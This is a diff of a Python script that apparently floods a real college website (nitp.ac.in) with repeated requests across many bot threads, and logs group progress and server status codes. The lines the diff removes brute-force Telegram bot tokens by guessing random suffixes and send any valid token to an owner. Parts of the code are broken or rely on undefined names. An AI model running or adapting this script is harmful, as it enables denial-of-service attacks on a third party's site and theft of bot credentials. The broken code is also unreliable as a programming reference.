@@ -1,28 +1,22 @@
 #ADMlNxd NITP
 import requests
-url = "https://bepractical.tech/"
-url = "http://173.214.161.242/responsive-design-define/?amp=1"
 chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
-for k in range(1000):
-  token = "609517172:" + "".join(random.choices(chars,k=35))
-  new_bot = Bot(token)
+LAST_ERROR = ""
+SERVER = "http://nitp.ac.in/php/home.php"
+for k in range(1005):
+  STATUS_CODE = 100 
   try:
-    #requests.get(url);
-    requests.get("http://nitp.ac.in/php/home.php")
-    username = None
-  except:
-    username = None
-    pass
-  if username:
-    print(token)
-    LOGGING(username)
-    LOGGING(token[11:])
-    new_bot.send_message(OWNER, token)
-    LOGGING("Har Har Mahadev 🚩")
-    LOGGING("#FOUND")
-    LOGGING("🚩 JAI SHREE RAM\n"*20)
+    res = requests.get(SERVER)
+    STATUS_CODE = res.status_code
+  except exception as e:
+    STATUS_CODE = 600
+    LAST_ERROR = str(e)
+    print(e)
   if botNo == THREAD_COUNT - 1:
-    #requests.get(url+"?s="+token[15:20]);
     ATTEMPT += 1
     if ATTEMPT % 500 == 0:
       LOGGING(f"🧔 #TASK\n#{GROUP_NAME} Group have completed {ATTEMPT} attempt with {THREAD_COUNT} Bots")
+    if ATTEMPT%100 == 0:
+      if STATUS_CODE>299:
+        LOGGING(f"SERVER: {SERVER}\nSTATUS_CODE: {STATUS_CODE}\nLAST ERROR: {LAST_ERROR}\nGROUP: #{GROUP_NAME}\nATTEMPT: {ATTEMPT}")
+      
